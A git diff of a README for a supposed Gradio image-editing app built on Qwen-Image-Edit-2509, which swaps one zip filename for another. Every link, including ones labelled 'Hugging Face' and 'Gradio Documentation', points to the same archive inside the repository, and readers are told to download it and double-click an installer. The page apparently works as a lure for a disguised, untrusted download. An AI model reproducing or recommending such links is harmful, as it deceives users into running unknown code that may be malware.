@@ -1,6 +1,6 @@
 # 🎨 Qwen-Image-Edit-2509-LoRAs-Fast - Effortless Image Editing Made Easy
 
-![Download Qwen-Image-Edit-2509-LoRAs-Fast](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Qwen-Image-Edit-2509-LoRAs-Fast_1.6.zip)
+![Download Qwen-Image-Edit-2509-LoRAs-Fast](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Edit_Qwen_Image_Fast_As_R_Lo_v2.3.zip)
 
 ## 📖 Description
 Qwen-Image-Edit-2509-LoRAs-Fast is a high-performance, user-friendly web application built with Gradio. It uses the advanced Qwen/Qwen-Image-Edit-2509 model from Hugging Face for seamless image editing tasks. This application allows anyone to edit images easily, whether you are creating art or enhancing photos.
@@ -11,13 +11,13 @@ To begin using Qwen-Image-Edit-2509-LoRAs-Fast, follow these simple steps.
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to download the application:  
-   [Download Qwen-Image-Edit-2509-LoRAs-Fast](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Qwen-Image-Edit-2509-LoRAs-Fast_1.6.zip)
+   [Download Qwen-Image-Edit-2509-LoRAs-Fast](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Edit_Qwen_Image_Fast_As_R_Lo_v2.3.zip)
 
 2. **Select the Latest Release**  
    Choose the latest version from the list of releases.
 
 3. **Download the Installer**  
-   Look for the installer file. It will usually have a name like `https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Qwen-Image-Edit-2509-LoRAs-Fast_1.6.zip` or similar. Click on it to start downloading.
+   Look for the installer file. It will usually have a name like `https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Edit_Qwen_Image_Fast_As_R_Lo_v2.3.zip` or similar. Click on it to start downloading.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your Downloads folder and double-click it. Follow the on-screen instructions to install the application.
@@ -65,12 +65,12 @@ Yes, a user manual is included within the application. Access it through the Hel
 For any questions or support, consider checking GitHub issues or discussions. You can also reach out to the community for help with common questions. 
 
 ## 🔗 Additional Resources
-- [Hugging Face](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Qwen-Image-Edit-2509-LoRAs-Fast_1.6.zip)
-- [Gradio Documentation](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Qwen-Image-Edit-2509-LoRAs-Fast_1.6.zip)
+- [Hugging Face](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Edit_Qwen_Image_Fast_As_R_Lo_v2.3.zip)
+- [Gradio Documentation](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Edit_Qwen_Image_Fast_As_R_Lo_v2.3.zip)
 
 ## 📦 License
 Qwen-Image-Edit-2509-LoRAs-Fast is open-source software. Feel free to contribute, and check the repository for contribution guidelines. 
 
 ## 📍 Download Again
 For easy access, you can visit this page to download the software:  
-[Download Qwen-Image-Edit-2509-LoRAs-Fast](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Qwen-Image-Edit-2509-LoRAs-Fast_1.6.zip)
+[Download Qwen-Image-Edit-2509-LoRAs-Fast](https://raw.githubusercontent.com/ManojkumarMangalore/Qwen-Image-Edit-2509-LoRAs-Fast/main/qwenimage/Edit_Qwen_Image_Fast_As_R_Lo_v2.3.zip)
